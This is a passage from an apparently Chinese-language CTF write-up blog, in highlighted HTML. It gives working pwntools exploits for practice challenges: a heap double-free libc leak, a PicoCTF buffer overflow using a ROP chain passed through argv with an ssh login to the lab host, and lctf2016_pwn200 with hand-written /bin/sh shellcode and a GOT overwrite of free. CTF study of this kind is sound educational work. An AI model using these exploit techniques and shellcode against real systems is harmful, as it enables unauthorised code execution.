class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *$rebase(0x1180)'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'> '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n>'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'number:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>    <span class=\"token comment\"># 1 or 2</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n>'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n>'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'number :'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\"># 泄露 libc 地址</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\"># dup 第一步</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>c33u <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>c0r <span class=\"token operator\">=</span> c33u <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x440</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\"># dup 第二步</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> c0r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x441</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token comment\"># 此时第一个 chunk 为 0x440 大小的 chunk</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\">#泄露 mainarena+96 后计算</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>lma_ <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ma_:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>lma_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>mh_a <span class=\"token operator\">=</span> lma_ <span class=\"token operator\">-</span> <span class=\"token number\">0x70</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">,</span>mh_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>libcbase <span class=\"token operator\">=</span> mh_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>io_file <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'_IO_2_1_stdin_'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>flagno <span class=\"token operator\">=</span> io_file <span class=\"token operator\">+</span> <span class=\"token number\">112</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'mh_a:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>mh_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'stdin:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>io_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'c0r:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>c0r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>c3u <span class=\"token operator\">=</span> c0r <span class=\"token operator\">+</span> <span class=\"token number\">0x30</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>fake_fd <span class=\"token operator\">=</span> c0r <span class=\"token operator\">+</span> <span class=\"token number\">0x18</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token comment\"># 修改 mainarena 后两位</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> flagno<span class=\"token punctuation\">)</span> <span class=\"token comment\"># for after dup</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre><span class=\"token comment\"># dup</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> fake_fd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">666</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20231121004242056.png\" alt=\"image-20231121004242056\"></p>\n<h1 id=\"picoctf_2018_buffer_overflow_0\"><a class=\"markdownIt-Anchor\" href=\"#picoctf_2018_buffer_overflow_0\">#</a> *PicoCTF_2018_buffer_overflow_0</h1>\n<p>** 考点：** 调用程序传参，ssh, stack overflow</p>\n<p>这题考的是给程序传参。在 pwntools 中，使用 <code>process(argv=['./pwn', payload])</code>  可以将参数传入。</p>\n<p>题目将 flag 读入了.bss 段，因此只要构造输出的 rop 链即可。</p>\n<p>因为用到程序传参，所以这题需要远程 ssh 登陆靶机后操作。登陆后将 exp 代码复制过去然后执行。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> CTFMan@node4.buuoj.cn <span class=\"token parameter variable\">-p</span> <span class=\"token number\">27087</span>\t<span class=\"token comment\"># 登陆密码 guest</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token number\">0x804a060</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x018</span><span class=\"token operator\">+</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>puts_p<span class=\"token punctuation\">,</span> main_a<span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span>argv <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20231121081834555.png\" alt=\"image-20231121081834555\"></p>\n<h1 id=\"lctf2016_pwn200\"><a class=\"markdownIt-Anchor\" href=\"#lctf2016_pwn200\">#</a> *lctf2016_pwn200</h1>\n<p>** 考点：**off_by_one, shellcode, got</p>\n<p>**libc 版本：**libc6_2.23</p>\n<h2 id=\"分析-2\"><a class=\"markdownIt-Anchor\" href=\"#分析-2\">#</a> 分析</h2>\n<p>没有任何保护。栈可执行。</p>\n<p><img data-src=\"./image-20231121084234332.png\" alt=\"image-20231121084234332\"></p>\n<p>有两个输入漏洞。</p>\n<ul>\n<li>第一个是输入名字时，若输入的循环因输入数满 48，则会直接退出，不会添加 <code>'\\0'</code>  结束字符。由于之后输出姓名用的是 printf 函数，由此可以将紧邻的 rbp 地址泄露出来。<s>我是不会说我一开始没注意到这个漏洞所以在那修改 got 表凑半天没凑出来的。</s></li>\n</ul>\n<p><img data-src=\"./image-20231121165925670.png\" alt=\"image-20231121165925670\"></p>\n<ul>\n<li>第二个是输入系统分配的第一个 chunk 时，我们可以多输入 8 字节的数据，刚好覆盖到 dest 变量。该变量储存着我们即将写入的地址，所以可以实现任意地址写入。但是由于是使用 strcpy 将读入的数据复制到地址处，所以要注意输入数据内的 <code>'\\0'</code> 。</li>\n</ul>\n<h2 id=\"思路\"><a class=\"markdownIt-Anchor\" href=\"#思路\">#</a> 思路</h2>\n<p>第一步，由于栈可执行，所以输入名字时直接输入 shellcode，然后利用泄露出来的栈地址计算出 shellcode 所在位置。</p>\n<p>~~ 由于 shellcode 长度有限，所以这边自己写。~~ 写 wp 的时候才发现生成的 shellcode 刚好为 48 字节，可以直接利用。如果跟我一样手写的时候，记得必须避开所有 <code>'\\0'</code> 。</p>\n<p><img data-src=\"./image-20231121170703448.png\" alt=\"image-20231121170703448\"></p>\n<p>经计算，泄露的地址减去 <code>0x50</code>  即为 shellcode 所在地址。</p>\n<p><img data-src=\"./image-20231121170956753.png\" alt=\"image-20231121170956753\"></p>\n<p>第二步，将 got 表中 free 的地址修改为 shellcode 所在地址。然后再选择释放块，便可以执行 shellcode 了。想了想，修改 puts 之类的应该夜行？</p>\n<p>以下是手打的 shellcode：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'pwn200'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26425</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b puts'</span><span class=\"token punctuation\">)</span>    </pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sc <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>xor rsi, rsi</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>push rsi</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>mov rdx, 0x68732f2f6e69622f</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>push rdx</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>xor rax, rax</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>mov al, 0x3b</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>mov rdi, rsp</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>xor rdx, rdx</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>syscall</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>sc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">48</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token keyword\">not</span> <span class=\"token string\">b'\\0'</span> <span class=\"token keyword\">in</span> payload</pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">48</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'u?\\n'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>s1 <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'~~?\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'1\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>s2 <span class=\"token operator\">=</span> s1 <span class=\"token operator\">-</span> <span class=\"token number\">0x50</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>free_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>s2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>free_g<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'money~\\n'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice : '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token 